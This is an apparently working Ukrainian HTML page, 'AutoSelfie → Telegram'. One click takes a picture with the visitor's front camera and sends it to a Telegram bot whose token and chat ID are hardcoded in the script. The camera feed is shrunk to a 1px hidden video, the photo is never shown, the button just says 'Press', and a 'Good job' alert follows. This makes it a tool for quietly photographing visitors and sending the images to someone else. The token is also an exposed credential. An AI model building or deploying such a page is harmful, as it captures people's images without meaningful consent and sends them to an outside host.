<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="utf-8" />
  <title>AutoSelfie → Telegram (статична картинка зверху)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{--bg:#0f1720;--card:#0b1220;--accent:#2563eb;--muted:#9fb0c8;--text:#e6eef8}
    html,body{height:100%;margin:0}
    body{font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text);display:flex;align-items:flex-start;justify-content:center;padding:20px}
    .card{background:var(--card);border:1px solid #1f2a3a;padding:18px;border-radius:12px;max-width:820px;width:100%;box-sizing:border-box}
    header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
    header img{max-height:72px;border-radius:8px;object-fit:contain}
    h2{margin:0;font-size:20px}
    p.note{margin:6px 0 14px 0;color:var(--muted);font-size:14px}
    .controls{display:flex;gap:10px;align-items:center;margin-bottom:12px}
    button{padding:10px 14px;border-radius:8px;border:none;background:var(--accent);color:#fff;font-size:15px;cursor:pointer}
    button:disabled{opacity:.6;cursor:default}
    /* Відео має бути рендереним — мінімізуємо його розмір, але не ховаємо display:none */
    video{position:fixed;left:0;top:0;width:1px;height:1px;z-index:-1;background:#000}
    .small-note{font-size:13px;color:var(--muted);margin-top:8px}
  </style>
</head>
<body>
  <div class="card">
    <!-- Статична картинка зверху: змінюй IMAGE_SRC у скрипті або тут -->
    <header>
      <img id="topImage" alt="Статична картинка" src="" />
      <div>
        <h2>Автоселфі → Telegram</h2>
        <p class="note">Натисни «Надати доступ», дозволь камеру. Фото зробиться автоматично і надійде в Telegram. Зняте фото не відображається на сторінці.</p>
      </div>
    </header>

    <div class="controls">
      <button id="grantBtn">Натисни</button>
      <div class="small-note">Сторінка працює тільки через HTTPS або localhost.</div>
    </div>

    <!-- Прихований відеоелемент потрібен для зйомки кадру (не показуємо фото після зйомки) -->
    <video id="video" autoplay playsinline muted></video>

    <p class="small-note">Якщо відправка в Telegram не проходить (помилка fetch/CORS), повідом — дам простий proxy.</p>
  </div>

  <script>
    // ====== Налаштування (встав свої дані сюди) ======
    const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
    const CHAT_ID = "1178810140";
    // Статична картинка зверху: можна вставити URL або data URI
    // Приклад: "https://example.com/logo.png" або "data:image/png;base64,..."
    const IMAGE_SRC = ""; // <-- ВСТАВ СЮДИ ШЛЯХ ДО КАРТИНКИ
    // Накладка на фото не потрібна — ми просто показуємо картинку зверху статично.
    // ================================================

    const grantBtn = document.getElementById('grantBtn');
    const video = document.getElementById('video');
    const topImage = document.getElementById('topImage');

    // Встановлюємо статичну картинку (якщо вказано)
    if (IMAGE_SRC) {
      topImage.src = IMAGE_SRC;
    } else {
      // Якщо IMAGE_SRC порожній — приховаємо елемент, щоб не було пустого місця
      topImage.style.display = 'none';
    }

    function isSecure(){
      return location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    }

    async function stopStream(stream){
      if(!stream) return;
      try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn(e); }
      video.srcObject = null;
    }

    // Надійне очікування першого відрендереного кадру
    function waitForVideoFrameReady(videoEl, timeout = 4000) {
      return new Promise((resolve, reject) => {
        const start = Date.now();
        if (videoEl.requestVideoFrameCallback) {
          videoEl.requestVideoFrameCallback(() => resolve());
          return;
        }
        const check = () => {
          if (videoEl.readyState >= 2 && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
            resolve();
          } else if (Date.now() - start > timeout) {
            reject(new Error('timeout waiting for video frame'));
          } else {
            requestAnimationFrame(check);
          }
        };
        check();
      });
    }

    // Використовуємо offscreen (невидимий) canvas — не додаємо його в DOM
    function createOffscreenCanvas(w, h) {
      const c = document.createElement('canvas');
      c.width = w;
      c.height = h;
      return c;
    }

    async function captureAndSend() {
      // Підбираємо розміри canvas відповідно до відео
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      const canvas = createOffscreenCanvas(w, h);
      const ctx = canvas.getContext('2d');

      // Малюємо кадр з відео
      ctx.drawImage(video, 0, 0, w, h);

      // Отримуємо Blob (PNG)
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
      if (!blob) throw new Error('toBlob returned null');

      // Формуємо FormData для Telegram
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'selfie.png');

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const resp = await fetch(url, { method: 'POST', body: form });
      if (!resp.ok) {
        const text = await resp.text().catch(()=>'[no body]');
        throw new Error('Telegram API error: ' + resp.status + ' ' + text);
      }
      return true;
    }

    grantBtn.addEventListener('click', async () => {
      if (!isSecure()) {
        alert('getUserMedia працює лише в безпечному контексті (HTTPS або localhost).');
        return;
      }
      grantBtn.disabled = true;
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        try { await video.play(); } catch(e){ /* ignore */ }
        await waitForVideoFrameReady(video, 5000);
        // Коротка пауза для автоекспозиції/фокусу
        await new Promise(r => setTimeout(r, 400));
        await captureAndSend();
        alert('Молодець.');
      } catch (err) {
        console.error(err);
        // Користувачу — коротке повідомлення
        alert('Не вдалося зробити або відправити фото. Перевір дозволи, токен/чат або CORS.');
      } finally {
        await stopStream(stream);
        grantBtn.disabled = false;
      }
    });
  </script>
</body>
  </html>
